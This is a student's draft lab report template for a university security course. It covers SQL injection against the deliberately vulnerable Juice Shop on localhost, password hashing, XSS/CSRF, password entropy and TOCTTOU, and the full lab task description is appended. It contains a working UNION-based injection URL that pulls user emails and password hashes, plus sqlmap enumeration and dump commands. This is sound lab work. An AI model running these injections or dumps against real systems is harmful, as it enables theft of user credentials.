---
bibliography: refs.bib
csl: ieee.csl
link-citations: true
---
# Lab 1: Secure Computer Systems — Higher Grades

**Date:** 19.11.2026
**Author:** Calvin Koch
**Course:** Secure Computer Systems I (1DT072, 11209, HT2026)
**Lab title:** Lab 1 - Secure Computer Systems
**Collaboration:** I worked independently.

This report contains only the higher-grade exercises. The parts marked
`[DELETE BEFORE SUBMISSION]` are instructions for completing the report and
must be removed after the results have been inserted.

## Task 1: SQL Injections

### 1.1 Hash extraction and cracking (Exercise 5)

[DELETE BEFORE SUBMISSION: Before writing this section, start Juice Shop and
record the exact URL and request that you use. Work only against the lab
instance.]

URL used:
http://localhost:3000/rest/products/search?q=a%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27,%20%2710%27%20FROM%20Users--

#### Steps

1. Start Juice Shop and log in or open the login page.
2. Open the browser developer tools and select the **Network** tab.
3. Perform the normal login request and identify the request sent to the
   login endpoint.
4. Record the request method, URL, parameters, and response. Do not include
   unrelated cookies or personal data in the report.
   Result: {
   "GET": {
   "scheme": "http",
   "host": "localhost:3000",
   "filename": "/rest/user/whoami",
   "query": {
   "fields": "email"
   },
   "remote": {
   "Address": "127.0.0.1:3000"
   }
   }
   }

   {
   "responseHeaders": {
   "headers": [
   {
   "name": "Access-Control-Allow-Origin",
   "value": "*"
   },
   {
   "name": "Connection",
   "value": "keep-alive"
   },
   {
   "name": "Content-Length",
   "value": "11"
   },
   {
   "name": "Content-Type",
   "value": "application/json; charset=utf-8"
   },
   {
   "name": "Date",
   "value": "Mon, 23 Nov 2026 14:09:34 GMT"
   },
   {
   "name": "ETag",
   "value": "W/\"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns\""
   },
   {
   "name": "Feature-Policy",
   "value": "payment 'self'"
   },
   {
   "name": "Keep-Alive",
   "value": "timeout=5"
   },
   {
   "name": "Vary",
   "value": "Accept-Encoding"
   },
   {
   "name": "X-Content-Type-Options",
   "value": "nosniff"
   },
   {
   "name": "X-Frame-Options",
   "value": "SAMEORIGIN"
   },
   {
   "name": "X-Recruiting",
   "value": "/#/jobs"
   }
   ]
   }
   }
   {
   	"requestHeaders": {
   		"headers": [
   			{
   				"name": "Accept",
   				"value": "application/json, text/plain, */*"
   			},
   			{
   				"name": "Accept-Encoding",
   				"value": "gzip, deflate, br, zstd"
   			},
   			{
   				"name": "Accept-Language",
   				"value": "en-US,en;q=0.5"
   			},
   			{
   				"name": "Connection",
   				"value": "keep-alive"
   			},
   			{
   				"name": "Cookie",
   				"value": "language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=78OoygKDLrVRwN4jxz2l3d15Swwhk8cgETk2cEadqZMYe6anmE9v1bQ5WJBX; continueCodeFindIt=apKrpYle05OkKgW23Rojx6BwLAWyytg2Tqz4PvDEzJMmabNVyd7XQqn9G1q7; continueCodeFixIt=W9opGkJd7rj4QgyR95X6ZzOVqaL44h9RTG0aBYKoln0wb3eMELNmPv28WDNZ"
   			},
   			{
   				"name": "Host",
   				"value": "localhost:3000"
   			},
   			{
   				"name": "If-None-Match",
   				"value": "W/\"27-NnEdAjEaaEue5GrJMECv9kynKzY\""
   			},
   			{
   				"name": "Priority",
   				"value": "u=0"
   			},
   			{
   				"name": "Referer",
   				"value": "http://localhost:3000/"
   			},
   			{
   				"name": "Sec-Fetch-Dest",
   				"value": "empty"
   			},
   			{
   				"name": "Sec-Fetch-Mode",
   				"value": "cors"
   			},
   			{
   				"name": "Sec-Fetch-Site",
   				"value": "same-origin"
   			},
   			{
   				"name": "User-Agent",
   				"value": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
   			},
   			{
   				"name": "X-User-Email",
   				"value": "testmail"
   			}
   		]
   	}
   }
5. Use the SQL injection from the mandatory task to confirm that the endpoint
   is injectable.
6. Use the lab’s approved method, such as `sqlmap`, to enumerate the SQLite
   database and identify the users table.
7. Retrieve the user names and password hashes. Save the terminal output in a
   temporary file so that the values are not mistyped in the report.
8. Try to recover cleartext passwords only from the hashes obtained in the
   lab. Record which method and word list you used.
9. Keep the original hash next to every recovered password. If a password
   cannot be recovered, write `not recovered` rather than guessing.

#### Results to insert

| User name         | Password hash     | Cleartext password                       | Recovery method     |
| ----------------- | ----------------- | ---------------------------------------- | ------------------- |
| `[INSERT USER]` | `[INSERT HASH]` | `[INSERT PASSWORD OR "not recovered"]` | `[INSERT METHOD]` |
| `[INSERT USER]` | `[INSERT HASH]` | `[INSERT PASSWORD OR "not recovered"]` | `[INSERT METHOD]` |

[DELETE BEFORE SUBMISSION: Add as many rows as the actual output contains.
Do not leave these example rows in the submitted report.]

#### Algorithm and security analysis

Identify the algorithm from the actual hash format and, if possible, the
Juice Shop source code. Do not identify it from length alone. Explain whether
the hashes are salted and whether the algorithm is deliberately slow.

The storage method could be improved by using a unique random salt for every
password and a slow, memory-hard password-hashing algorithm such as Argon2,
scrypt, or bcrypt. A salt prevents equal passwords from producing equal
stored values and makes precomputed tables less useful. A slow password
hashing function reduces the number of guesses an attacker can test.

[DELETE BEFORE SUBMISSION: Replace the following bracketed values with the
actual algorithm and observations.]

> The hashes use `[INSERT ALGORITHM]`. I identified this from `[INSERT HASH FORMAT OR SOURCE-CODE EVIDENCE]`. The hashes `[appear/do not appear]` to use
> a unique salt because `[INSERT OBSERVATION]`.

### 1.2 Automated exploitation with sqlmap (Exercises 6–9)

#### Steps

1. Install or open `sqlmap` on the Kali machine.
2. Start Juice Shop and make sure it is reachable from the same machine.
3. Use the browser network monitor to find the vulnerable request and copy its
   URL or request file. A request file is preferable when authentication
   headers are needed.
4. First run sqlmap in detection mode without `--dump`. Replace every value
   in angle brackets with the values from your own lab:

```bash
sqlmap -u "<INSERT_URL>" \
  --data="<INSERT_POST_DATA>" \
  --batch
```

5. If the endpoint requires authentication, export the relevant request from
   the browser and use:

```bash
sqlmap -r request.txt --batch
```

6. Confirm that sqlmap reports an injection point. Record the parameter name,
   injection type, and backend database.
7. Enumerate the database:

```bash
sqlmap -r request.txt --dbms=sqlite --dbs --batch
sqlmap -r request.txt --dbms=sqlite -D <DATABASE> --tables --batch
```

8. Dump the relevant table:

```bash
sqlmap -r request.txt \
  --ignore-code=401 \
  --technique=U \
  --dbms=sqlite \
  -D <DATABASE> -T <TABLE> --dump --batch
```

9. If the request does not need a request file, use `-u` and `--data`
   instead. Use `--ignore-code=401` only when the endpoint actually returns
   HTTP 401 during testing.
10. Save the successful command and the short part of the output that proves
    the database, table, and extracted values. Do not paste pages of
    diagnostic output into the report.

#### Command and output wireframe

```text
Command:
sqlmap [INSERT THE EXACT COMMAND USED]

Target:
URL or request file: [INSERT]
Parameter tested: [INSERT]
Database identified: [INSERT]
Table identified: [INSERT]

Relevant output:
[PASTE ONLY THE LINES SHOWING THE INJECTION, DATABASE, TABLE, AND RESULTS]
```

[DELETE BEFORE SUBMISSION: Remove this wireframe instruction and replace it
with your actual command and shortened output.]

#### Option explanations

* `--ignore-code 401` tells sqlmap to continue when the server returns HTTP
  status 401. It should only be included if that response interfered with the
  test.
* `--technique=U` restricts testing to UNION-based SQL injection.
* `--dbms=sqlite` tells sqlmap which database system is being tested.
* `--dump` retrieves rows from the selected table.

Explain how the tested parameter becomes part of the SQL query and why the
returned response shows that the injection worked. Include the exact
parameter and endpoint from the experiment.




## Task 2: XSS/CSRF

### 2.1 Higher-grade XSS/CSRF protection comparison (Exercise 6)

[DELETE BEFORE SUBMISSION: This section is a guide. Keep the final examples
and explanations, but remove the instructions and bracketed placeholders.]

#### Scenario A: XSS protected, CSRF vulnerable

##### Steps to create the example

1. Choose a state-changing action in Juice Shop, such as changing an email,
   changing a password, or placing an order.
2. Confirm that the action works normally while logged in.
3. Create a separate local HTML page containing a form that submits the same
   state-changing request. Do not send it to any real website.
4. Remove or omit any anti-CSRF token from the test request.
5. Open the local page in a browser that is already logged in to the lab
   application.
6. Record whether the browser sends the request and whether the application
   accepts it.

##### Wireframe

> If the website had effective XSS protection but no CSRF protection, an
> attacker could host `[INSERT MALICIOUS PAGE OR FORM]`. When a logged-in
> victim opened it, the browser would send `[INSERT STATE-CHANGING REQUEST]`.
> The application would accept it because `[INSERT WHY THE SERVER TRUSTS THE REQUEST]`. The result would be `[INSERT CONCRETE IMPACT]`.

#### Scenario B: CSRF protected, XSS vulnerable

##### Steps to create the example

1. Identify the anti-CSRF token used by the application, if one is present.
2. Confirm that a request without the token is rejected.
3. In a controlled lab page, demonstrate that an XSS payload running in the
   application’s origin can read the token from the DOM or page state.
4. Explain how the same script could submit a state-changing request with the
   token included.
5. Do not transmit tokens, cookies, or personal data outside the lab.

##### Wireframe

> If the website had CSRF protection but still allowed XSS, an injected script
> could read `[INSERT TOKEN LOCATION]` and send a request to
> `[INSERT ENDPOINT]`. The CSRF defence would not stop it because the script
> runs in the trusted origin and can include the valid token. The impact would
> be `[INSERT CONCRETE IMPACT]`.

#### Combined protection scheme

Use context-aware output encoding and safe input handling for XSS, a strict
Content Security Policy, anti-CSRF tokens for state-changing requests, and
appropriate `SameSite` cookie settings [@owasp_xss; @owasp_csrf]. Explain the
role of each defence and why one defence cannot replace the others.

> My combined scheme is `[INSERT YOUR SCHEME]`. Output encoding prevents
> `[INSERT XSS EFFECT]`, CSP limits `[INSERT WHAT CSP LIMITS]`, and the
> anti-CSRF token proves `[INSERT WHAT THE TOKEN PROVES]`. SameSite cookies
> add `[INSERT ADDITIONAL PROTECTION]`. These controls work together because
> `[INSERT SHORT JUSTIFICATION]`.

## Task 3: Password Policy

### 3.1 Information-theory minimum length

The policy allows 93 symbols and requires at least 27 bits of entropy.

#### Steps

1. Count the allowed alphabet as 93 symbols, using the assignment list.
2. Calculate the entropy per random symbol:

```text
log2(93) = [CALCULATE THIS VALUE] bits
```

3. Divide the required entropy by the entropy per symbol:

```text
27 / log2(93) = [CALCULATE THIS VALUE]
```

4. Round up to the next whole character.
5. Explain why the policy still requires 10 symbols: a human-selected
   password is not uniformly random. Compare this with the NIST discussion
   of memorized secrets [@nist800632].

#### Results wireframe

> For a random password using all 93 allowed symbols, each symbol gives
> `log2(93) = [INSERT]` bits. Therefore, 27 bits require
> `27 / log2(93) = [INSERT]`, so the theoretical minimum is `[INSERT]`
> symbols after rounding up. The policy requires 10 symbols because
> `[INSERT EXPLANATION ABOUT HUMAN-CHOSEN PASSWORDS]`.

### 3.2 Entropy comparison for lengths n and 2n

#### Steps

1. Use an alphabet of 62 symbols.
2. Write the entropy for length `n`:

```text
E(n) = n * log2(62)
```

3. Write the entropy for length `2n`:

```text
E(2n) = 2n * log2(62)
```

4. Compare the equations and state the factor.

#### Results wireframe

> For an alphabet of 62 symbols, `E(n) = [INSERT FORMULA]` and
> `E(2n) = [INSERT FORMULA]`. Therefore, doubling the length
> `[doubles/does not double]` the entropy, assuming independent random
> choices.

### 3.3 Brute-force time estimate

#### Steps

1. Use the required 93-symbol alphabet and a password length of 10.
2. Calculate the total number of candidates:

```text
93^10 = [CALCULATE]
```

3. Divide by 1000 guesses per second:

```text
93^10 / 1000 = [CALCULATE] seconds
```

4. Convert seconds to years by dividing by
   `60 * 60 * 24 * 365`.
5. State both the worst-case time and the average time. The average
   exhaustive-search time is approximately half the worst case.

#### Results wireframe

> There are `[INSERT NUMBER]` possible passwords. At 1000 guesses per
> second, checking all of them would take `[INSERT SECONDS]` seconds, or
> approximately `[INSERT YEARS]` years. The average successful search would
> take approximately `[INSERT HALF-WORST-CASE VALUE]` years.

## Task 4: Design Principles (Exercises 9–11)

### 4.1 Investigating the violated principles

#### Steps

1. Read the relevant design principles in Saltzer and Schroeder, especially
   complete mediation, least privilege, fail-safe defaults, and economy of
   mechanism [@saltzer1975protection].
2. Return to the TOCTTOU experiment in the mandatory report.
3. Identify the exact moment when the file is opened or permission is checked.
4. Identify what changes during the pause.
5. Explain which principle is affected and why. Do not claim that every
   principle is violated if the experiment does not demonstrate it.

#### Evidence table

| Observation from experiment | Relevant principle                | Explanation              |
| --------------------------- | --------------------------------- | ------------------------ |
| `[INSERT OBSERVATION]`    | `[INSERT PRINCIPLE]`            | `[INSERT EXPLANATION]` |
| `[INSERT OBSERVATION]`    | `[INSERT PRINCIPLE, IF NEEDED]` | `[INSERT EXPLANATION]` |

#### Analysis wireframe

> The main principle affected is **[INSERT PRINCIPLE]**. The check happens
> at `[INSERT CHECK TIME]`, but the file is used at `[INSERT USE TIME]`.
> Between these points, `[INSERT CHANGE]` can occur. This means
> `[INSERT SECURITY CONSEQUENCE]`.

### 4.2 Fixes, advantages, and trade-offs

#### Steps

1. Propose an atomic operation or a design that opens the file with the
   required access and then uses the trusted descriptor.
2. Consider file locking or operating-system primitives that prevent the
   object from being replaced during the operation.
3. Explain how the fix reduces the check/use race.
4. Identify the cost: performance, complexity, portability, or availability.
5. Decide which fix should be prioritised for a security-sensitive file and
   justify the decision.

#### Results wireframe

> I would fix the problem by `[INSERT FIX]`. This reduces the race because
> `[INSERT MECHANISM]`. The main advantage is `[INSERT ADVANTAGE]`, while the
> main cost is `[INSERT TRADE-OFF]`. I would prioritise `[INSERT PRIORITY]`
> because `[INSERT JUSTIFICATION]`.

## References

DELETE LATER: FULL TASK DESCRIPTION FOR LAB 1 INCLUDING HG AND NON-HG

# Lab 1 Tasks

In this first lab, you will get to use Juice Shop, explain jokes, do some programming, and send secure email.

Post any questions you have concerning the lab on our Slack channel! [](mailto:niklas.kostrzewa@gmx.de)

### Hints

The Juice Shop is a web application. You may learn things from reading the web page sources (in Firefox or Chrome right-click in the background and select “View Page Source”. For** **[Edge**Links to an external site.**](https://www.makeuseof.com/tag/enable-inspect-element-view-source-edge/) and [Safari**Links to an external site.**](https://discussions.apple.com/thread/4325736), a "developer mode" must be enabled).

You may also find some web developer tools for observing web requests on the network useful:** **[Network monitor in Firefox**Links to an external site.**](https://developer.mozilla.org/en-US/docs/Tools/Network_Monitor),** **[Web inspector in Safari**Links to an external site.**](https://developer.apple.com/safari/tools/),** **[Network tool in Edge**Links to an external site.**](https://learn.microsoft.com/en-us/microsoft-edge/devtools/network/reference) and** **[Network Capture in Explorer**Links to an external site.**](https://docs.microsoft.com/en-us/previous-versions//gg130952(v=vs.85)?redirectedfrom=MSDN).

# Task 1: SQL injections

Read about SQL injections before doing the exercises. You are expected to be able to explain SQL statements in detail. Otherwise, review the Introductory lab (or your database course) before starting on this lab.

### Exercises:

1. Perform SQL injections in at least one input field on the Juice Shop website. In the lab report, give the injections and the output/result. Explain what an SQL injection is, and use your example injections to illustrate how and why the SQL injection works. How is your input used in an SQL query?
2. Perform an SQL injection on Juice Shop to log in as a user** ***other than* the administrator. In the lab report, explain how the SQL injection works, and why it gives the desired result. How is your input used in an SQL query?
3. What could a system administrator do to prevent SQL injections such as the ones you just did? Explain carefully in the lab report.
4. Explain the below comic strip in your lab report in a boring,** ****technical** and thorough way, clarifying what happened to the school and what they should do about it.
   ![exploits_of_a_mom.png](https://uppsala.instructure.com/courses/119888/files/10839712/preview)
5. **[higher grades only]** Get a list of all user names and password hashes in Juice Shop via an SQL injection attack. From the hashes uncover as many clear text passwords as you can, reporting them alongside their corresponding hashes. What is the hashing algorithm used? Give two ways in which the method of storing passwords could have been made more secure.
   Juice Shop is a single-page web application, i.e. whenever you interact with it it requests content from the server. You can observe the communication with the server through the mentioned developer tools. On the Kali machines you find the tool** **`sqlmap` that may help you with this task. What does the tool do and how does it arrive at a query?
   Carefully explain how and why the attack works. How is your input used in an SQL query? How did you arrive at the solution?
   Should your solution use any of the following parameters to** **`sqlmap` describe their meaning:
   `--ignore-code 401 --technique=U --dbms=sqlite --dump`

# Task 2: XSS/CSS

### Exercises:

1. Read about XSS (or CSS, Cross-Site Scripting; see e.g. Section 4.3 in the 5th ed of the coursebook, or** **[on the OWASP wiki**Links to an external site.**](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) and use your knowledge to perform an XSS attack on Juice Shop. In the lab report, give step-by-step instructions for another user to replicate your attack. Explain how your attack works and why.
   **NOTE** that a simple scripting attack just generating a pop-up window with a static message is not sufficient. Consider slightly more interesting attacks, e.g. leaking information to a third party.
2. Read about CSRF (Cross-Site Request Forgery); see e.g.** **[on the OWASP wiki**Links to an external site.**](https://owasp.org/www-community/attacks/csrf). What is the difference between a CSRF attack and an XSS attack, conceptually? Think in terms of trust and deception, discuss within the group, and explain carefully in the lab report.
3. **[higher grades only]** Discuss the possible ramifications of having a website that is protected against XSS attacks but not against CSRF attacks, and vice versa. Give concrete examples. Suggest a scheme for protecting your website against both types of attacks. Discuss why it will work and how.

# Task 3: Authentication

### Exercises:

1. Write a program to construct an “XKCD-style” password (see** **[http://xkcd.com/936**Links to an external site.**](http://xkcd.com/936)), given an input saying how many words it should contain.
   You can use any word list you have access to (e.g.** **`/usr/share/dict/words` or a dictionary from your Kali installation). Make the program not only print the generated password, but also report on its entropy. Also have it explain how many random letters and digits you would need to use to get the same entropy.
   For example, given the input 4, it could output

   ```
   redemise underking combmaker embark
   4 RANDOM words from word list of NNNNNN words
   Entropy: nn.nn bits
   You need mm.mm RANDOM characters in [a-zA-Z0-9] to get the same entropy.
   ```

   Show an example run of your program, and explain the result.

   Of course, document your program well and explain how it works.
2. Suppose an attacker attempts** ***shoulder surfing* (see** **[the infographic**Links to an external site.**](https://www.ncsc.gov.uk/collection/passwords)), but doesn’t fully see the keyboard. However, the attacker hears that 10 keys are pressed, and manages to notice that the Shift key is used only three times.
   What is the entropy of the password? Explain your calculations, and if you need, make assumptions and clarify them in your answer.
3. In your group, get certificates for S/MIME secure email, e.g.** **[from the university**Links to an external site.**](https://www.harica.gr/) using the** **[following guide to request and install a personal certificate](https://uppsala.instructure.com/courses/119888/files/10839724?wrap=1 "uu_guide-create_personal_cert.pdf")[Download following guide to request and install a personal certificate](https://uppsala.instructure.com/courses/119888/files/10839724/download?download_frd=1)[Open this document with ReadSpeaker docReader** **](https://docreader.readspeaker.com/docreader/?cid=4462&lang=en_uk&url=https%3A%2F%2Finst-fs-dub-prod.inscloudgate.net%2Ffiles%2Fe8923ab0-ab68-495a-9104-41e695cda685%2Fuu_guide-create_personal_cert.pdf%3Ftoken%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3OTU0MzQyMjgsInVzZXJfaWQiOm51bGwsInJlc291cmNlIjoiL2ZpbGVzL2U4OTIzYWIwLWFiNjgtNDk1YS05MTA0LTQxZTY5NWNkYTY4NS91dV9ndWlkZS1jcmVhdGVfcGVyc29uYWxfY2VydC5wZGYiLCJob3N0IjpudWxsLCJqdGkiOiJiYmRlMTdjNy0xYzZkLTRmOTktOGY2MS1kMTg1ZGE0MjZlY2MiLCJleHAiOjE3OTU1MjA2Mjh9.6BkTtVtCYJZ6XnGOI4KLhD7WtEv5YEl1NJAJafrvn5BTQznJwOtRTBjPmtMhndGFzA5O2iwREhHkd0h9nJcWSA "Open this document with ReadSpeaker docReader"). (For university issued certificates, note that your identity documents probably were already checked when you got your student account.) Try sending encrypted email to each other. Then send signed emails to each other, and after that again check that you can send encrypted email to each other.

   1. In the lab report, describe some details of your certificate: Who is the** ***issuer* of your certificate? Until when is your certificate valid?
   2. Why can you not send encrypted email to each other before sending the signed email? Explain carefully in the lab report.
   3. This task is most conveniently done using an email program (such as Thunderbird) rather than using a webmail system. Why? Explain in the lab report.

   (After doing this task, whenever you send email to the teachers and assistants of this course, please consider using signed/encrypted email if it’s not too inconvenient.)
4. **[higher grades only]** In the [policy for information security at Uppsala University**Links to an external site.**](<https://www.uu.se/download/18.385815e518a9322c80e5f43b/1695896083676/Riktlinjer%20f%C3%B6r%20informationss%C3%A4kerhet.pdf>)[Open this document with ReadSpeaker docReader** **](https://docreader.readspeaker.com/docreader/?cid=4462&lang=en_uk&url=https%3A%2F%2Fwww.uu.se%2Fdownload%2F18.385815e518a9322c80e5f43b%2F1695896083676%2FRiktlinjer%2520f%25C3%25B6r%2520informationss%25C3%25A4kerhet.pdf "Open this document with ReadSpeaker docReader")(in Swedish only) from 2013 defines** ***good passwords* (and also references page 107 from the NIST Special Publication** **[800-63-2 &#34;Electronic Authentication Guideline&#34;**Links to an external site.**](https://doi.org/10.6028/NIST.SP.800-63-2)).
   According to the policy a good password has at least 27 bits entropy and satisfies the three constraints:

   1. A password is at least 10 symbols
   2. The allowed 93 symbols are:
      1. A-Z, a-z
      2. 0-9
      3. space character
      4. following special characters:** **`~`,** **`!`,** **`@`,** **`#`,** **`$`,** **`%`,** **`^`,** **`(`,** **`)`,** **`_`,** **`+`,** **`-`,** **`*`,** **`/`,** **`=`,** **`{`,** **`}`,** **`[`,** **`]`,** **`|`,** **`\`,** **`:` (colon),** **`;` (semi-colon),** **`'` (single quotation mark),** **`"` (double quotation mark),** **`<`,** **`>`,** **`,` (comma),** **`.` (full stop) and** **`?`
   3. It should contain at least one capital letter, one lower case character and at least either a special character or a digit.

   Exercises:

   * According to the theory of information, calculate the minimum length of allowed passwords.
     The policy also states that passwords should have at least 10 symbols. Explain how and why this differs from your previous calculation (Hint: Check the NIST Publication!).
   * More generally for an alphabet of size 62, compare the entropies of a password of length** ***n* and 2*n.
     *Assume that you have a machine that tries all possible passwords of a given length. How long would it** ***comparably* take to break the password if you have a machine that can check 1000 guesses per second?

# Task 4: Access control

1. Write a short program (less than 50 lines) in your favorite programming language (we recommend** **`python`), to test the** **[TOCTTOU**Links to an external site.**](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) (Time Of Check To Time Of Use) problem. The program should:

   * open a file for writing,
   * stop and wait for input from the user,
   * write on the file descriptor,
   * close the file, and
   * report any errors by printing messages.

   After creating the file that your program will open, and giving yourself permission to write to the file, you should test it by doing the following:

   1. Run the program, and allow it to proceed until it stops and waits for input.
   2. Run the program, but when it stops and waits for input, first change the permission on the file to remove your write right, and then let it proceed.
   3. Run the program without changing the permissions on the file (i.e., run it without write permission). Give yourself permission to write to the file again, run the program again, and when it stops and waits for input, delete the file before letting the program proceed.

   In your lab report, hand in your commented and properly indented program. Also include the printouts from your tests, including printout of the file permission before and after each test. Finally, write an analysis of the printouts: what are the results, and why are the results what they are? Describe the access controls.
2. Repeat the experiment in another operating system: if you used Windows in the previous exercise, use Linux/Mac, and vice versa.
   If you do not have different system in your group, Janus has python3 installed. There is also the possibility to use an virtual machine.
   Use the same program, if you can.
   If you find differences in behaviour between the experiments, explain them.
3. **[higher grades]** Some behaviour you discovered in the previous exercises are against the** **[design principles of Saltzer and Schroeder](https://uppsala.instructure.com/courses/119888/files/10839726/download?wrap=1 "Saltzer and Schroeder 1975.pdf")[Download design principles of Saltzer and Schroeder](https://uppsala.instructure.com/courses/119888/files/10839726/download?download_frd=1)[Open this document with ReadSpeaker docReader** **](https://docreader.readspeaker.com/docreader/?cid=4462&lang=en_uk&url=https%3A%2F%2Finst-fs-dub-prod.inscloudgate.net%2Ffiles%2F3492534a-7478-4fcf-a011-ad5d79f5ad5d%2FSaltzer%2520and%2520Schroeder%25201975-1.pdf%3Ftoken%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3OTU0MTA4NzIsInVzZXJfaWQiOm51bGwsInJlc291cmNlIjoiL2ZpbGVzLzM0OTI1MzRhLTc0NzgtNGZjZi1hMDExLWFkNWQ3OWY1YWQ1ZC9TYWx0emVyJTIwYW5kJTIwU2Nocm9lZGVyJTIwMTk3NS0xLnBkZiIsImhvc3QiOm51bGwsImp0aSI6IjNiZmYxZDJmLTZhMjAtNGMwNy1hMTMzLTE1MDQ2N2RhMzlkNyIsImV4cCI6MTc5NTQ5NzI3Mn0.oV0F7cigfuSglXpM3tTxp1in6J48Jzxf1kKHOphqdnxq2HWuofxCOUIQmkR2eW7ub9hD6t4HMZgnp1b9S_e6Uw "Open this document with ReadSpeaker docReader"). Explain which, and discuss the reasons why the principles are not being followed. Also suggest how and where to fix the problem. What problems could you see with doing the fixes, what would the advantages be, and how could you motivate the balance? What should be prioritized, and why?

# Handing in

Ensure that you comply with** **[our rules for format and style of your hand-in](https://uppsala.instructure.com/courses/119888/pages/labs-hand-in-instructions "Labs: Hand-in instructions").
